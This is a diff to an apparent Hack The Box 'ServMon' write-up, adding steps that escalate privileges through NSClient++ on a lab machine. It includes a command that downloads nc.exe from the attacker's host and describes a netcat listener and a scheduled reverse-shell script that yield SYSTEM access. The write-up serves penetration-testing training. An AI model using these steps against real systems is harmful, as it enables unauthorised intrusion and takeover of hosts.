@@ -283,7 +283,7 @@ We can now access NSClient from the browser:
 ![Web gui authentication fail]({{https://jsom1.github.io/}}/_images/htb_servmon_auth.png)
 </div>
 
-The page is here but we can't authenticate. This is because we saw in the allowed hosts that we have to request the page from 127.0.0.1 (localhost). I tried to replace 10.10.10.184 in the address but it didn't work (error *unable to connect*). So, I looked at the API and saw we can authenticate from the terminal:
+The page is here but we can't authenticate. This is because we saw in the allowed hosts that we have to request the page from 127.0.0.1 (localhost). I tried to replace 10.10.10.184 in the address but it didn't work for some reason (error *unable to connect*). So, I looked at the API and saw we can authenticate from the terminal:
 
 <div class="img_container">
 ![NSClient API]({{https://jsom1.github.io/}}/_images/htb_servmon_api.png)
@@ -309,6 +309,49 @@ We create *evil.bat* with nano and copy the code given in the exploit's document
 ![files on desktop]({{https://jsom1.github.io/}}/_images/htb_servmon_files.png)
 </div>
 
-The 2 files are here and ready to be uploaded on the server.
+The 2 files are here and ready to be uploaded on the server. To do this, we start a web server on our Kali machine:
+
+<div class="img_container">
+![Start a web server]({{https://jsom1.github.io/}}/_images/htb_servmon_server.png)
+</div>
+
+We can check that it works by navigating at our address (which can be seen with the command *sudo ifconfig tun0*):
+
+<div class="img_container">
+![Check web server]({{https://jsom1.github.io/}}/_images/htb_servmon_check.png)
+</div>
+
+We can now use Powershell to transfer the files from Kali to SerMon (I tried to do it with *curl http://10.10.14.14/nc.exe" -outfile "c:\temp\nc.exe"*, but I got permission denied):
+
+<div class="img_container">
+![File transfer]({{https://jsom1.github.io/}}/_images/htb_servmon_transfer.png)
+</div>
+
+We can see the files in C:\\Temp, so we know the transfer worked.\\
+The 4th step is t setup a listener on our Kali machine. We can use netcat to do that:
+
+<div class="img_container">
+![setup listener]({{https://jsom1.github.io/}}/_images/htb_servmon_listener.png)
+</div>
+
+In the 5th and 6th steps, we have to add a scheduler that call the script every minute:
+
+<div class="img_container">
+![scheduler]({{https://jsom1.github.io/}}/_images/htb_servmon_sched.png)
+</div>
+
+At this point, we're supposed to restart the machine. However, I checked my permissions and saw the following:
+
+<div class="img_container">
+![whoami]({{https://jsom1.github.io/}}/_images/htb_servmon_whoami.png)
+</div>
+
+We're *nt authority\system*. The last thing to do is navigate to the administrator's desktop to grab the root flag:
+
+<div class="img_container">
+![root flag]({{https://jsom1.github.io/}}/_images/htb_servmon_root.png)
+</div>
+
+That's it !
 
 <ins>**My thoughts**</ins>
